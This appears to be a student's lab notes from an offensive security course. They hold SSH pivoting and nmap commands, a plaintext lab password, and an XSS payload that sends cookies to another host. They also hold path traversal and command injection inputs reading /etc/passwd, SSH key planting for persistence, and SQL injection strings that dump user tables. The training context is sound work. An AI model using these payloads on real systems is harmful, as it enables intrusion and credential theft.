# Security
MIDY-003-M
USERINFO::http://10.50.21.3/classinfo.html
CTFd::http://10.50.20.250:8000

xfreerdp /v:10.50.29.185 /u:student +clipboard +dynamic-resolution +glyph-cache

Stack: 1 	
Username: MIDY-003-M 	
Password: 98DjctjRf4TQpHB ---- password
Lin.internet: 10.50.28.189
Lin.Ops: 10.50.25.1
Win.Ops: 10.50.29.185

## SSH
ssh student@10.50.28.189 -D 9050
ssh student@10.50.28.189 -L1111:192.168.28.111:8080

ssh -MS /tmp/jump student@10.50.28.189 
ssh -S /tmp/jump dummy
ssh -S /tmp/jump -O forward -D 9050 dummy  --- DYNO port 
ssh -S /tmp/jump -O cancel -D 9050 dummy  --- DYNO port 

proxychains nmap -Pn -T4 -n -p1-10000 192.168.128.111

ssh -S /tmp/jump -O forward -L1111:10.100.28.40:80 DUMB
ssh -S /tmp/jump -O forward -L2222:192.168.28.111:8080 DUMB
ssh -S /tmp/jump -O forward -L3333:192.168.28.111:2222 DUMB
ssh -MS /tmp/T1 student@127.0.0.1 -p3333

1243ASDFasdf!!!!
## NMAP scanning
HOST DISCOVERY: 
    for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
    
 ///NMAP scripts --
    --script http-enum.nse
    --script smb-os-discovery.nse //only with windows
 
PORT ENUMERATION:  
    sudo proxychains nmap -Pn -T4 -sT -p1-10000 10.100.28.40 2>/dev/null

PORT INTERIGATION:  
    proxychains nc 10.100.28.40 80







# Web Expliotation (XSS)
**Requests**
GET
POST
HEAD
PUT

**HTTP Response Codes**
10X == Informational
2XX == Success
30X == Redirection
4XX == Client Error
5XX == Server Error

https://user-agents.net/lookup

Check for Robots.txt

sudo apt install nikto -y

nikto -h 10.100.28.40

**Attack Methods**
//Cookie script  ------did not do -- cookie found in back end

 <script>document.location="http://10.100.28.55/Cookie.php?username=" + document.cookie;</script>


//Directory Traversal(GET) -- myfile=../../../../etc/passwd
//Directory Traversal(POST) -- File to read [../../../../etc/passwd]

//Malicious File Upload
Bad.php -- on lin-ops
goes to /uploads

//Command Injection
;whoami
;cat /etc/passwd
;ls -latr & netstat -rn
|| ifconfig

//SSH Key Upload
ssh -keygen -t rsa -- on lin-ops
cat ~/.ssh/id_rsa.pub  --copy this
                    --on web host
whoami -- find user                    
cat /etc/passwd -- find users home directory                    
ls -la /users/home/directory      --check if .ssh exists
mkdir /users/home/directory/.ssh   --make .ssh in users home folder if it does not exist
echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys  -- puts ssh key in dir
cat /users/home/directory/.ssh/authorized_keys  -- verify



# Web Exploitation(SQL)

FOLLOW THE STEPS
we are using "mysql"
we wont be writeing to a database
may be case sensitive
Schema and Database are interchangable
@@Version gives version number
GET -- URL  ---- if you cant type, it is a get method
POST -- input box

if you see username and password input fields, use sql

DONT FORGET ABOUT THE "ESCAPE STRING"

Database(tables(columns(data)))


[Information_schema]
[mysql]               ----- These are defaults
[performance_schema] 

**Select**
**Union**


SHOW DATABASES;
show tables;
select * from session.car;

select * from session.car UNION select name,type,cost,color from session.car:

------------------------------------------------
###TESTING###
IF LOGIN PAGE TEST SQL BY USING THIS
'or 1='1

GO TO DEVCON, OPEN NETWORK TAB, CLICK REQUEST, POST METHOD, HIT 'RAW' SWITCH, COPY CONTENTS
PUT '?' AFTER THE URL, PASTE RAW CONTENTS

THE ONLY THING YOU CAN GET FROM A LOGIN PAGE IS USERNAMES AND PASSWORDS

------------------------------------------------
###DUMPING THE DATABASE###
**using valid querys to dump the databases**

POST            Audi'or 1='1

GET             OR 1 = 1 ;#

------------------------------------------------
###FINDING THE AMOUNT OF COLUMNS###

Audi' UNION SELECT 1,2,3,4,5;#

------------------------------------------------
###GOLDEN STATEMENT###
UNION SELECT table_schema,table_name,column_name FROM information_schema.columns;#

---POST
**WORKING EXAMPLES**
UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns;#
Audi'UNION SELECT id,2,name,pass,5 FROM session.user;#
Audi'UNION SELECT tireid,2,name,size,cost FROM session.Tires;#


---GET
**WORKING EXAMPLES**
?Selection=2 UNION SELECT 1,3,2 FROM information_schema.columns;#
?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns;#
?Selection=2 UNION SELECT username,studentID,passwd FROM session.userinfo;#








